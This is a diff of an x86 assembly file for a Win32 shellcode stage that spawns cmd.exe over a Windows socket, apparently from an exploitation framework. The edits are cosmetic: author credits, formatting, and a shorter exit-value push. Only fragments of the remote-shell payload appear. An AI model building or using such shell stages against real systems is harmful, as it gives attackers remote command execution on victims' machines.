@@ -1,6 +1,6 @@
 ;      Title:  Win32 cmd.exe shell stage for WSA sockets
 ;  Platforms:  Windows NT 4.0, Windows 2000, Windows XP, Windows 2003
-;     Author:  hdm, spoonm, vlad902
+;     Author:  hdm, spoonm, skape, vlad902
 
 [BITS 32]
 
@@ -14,6 +14,8 @@
 ; %1 = whether to resolve our own functions or not
 ; if %1 = 0 then you must have FN_CREATEPROCESS, etc
 %macro STAGE_WSA_SHELL 1
+  ; Struct init and CreateProcessA call orignally written by skape (mmiller@hick.org)
+  ; Modified and optimized by vlad902 (vlad902@gmail.com)
   LSetCommand:
       push "CMD"
       mov esi, esp
@@ -29,7 +31,7 @@
       mov ebx, esp	  ; beginning for first struct.
 
   LBZero:
-      xor eax,eax         ; overwrite with null
+      xor eax, eax         ; overwrite with null
       rep stosb           ; overwrite with null
 
   LCreateStructs:
@@ -88,8 +90,7 @@
       call [ebp + 4]
 %endif
       
-      xor ebx, ebx
-      push ebx
+      push byte 0x00	; exit value (0)
 %if %1 == 1
       call eax
 %else
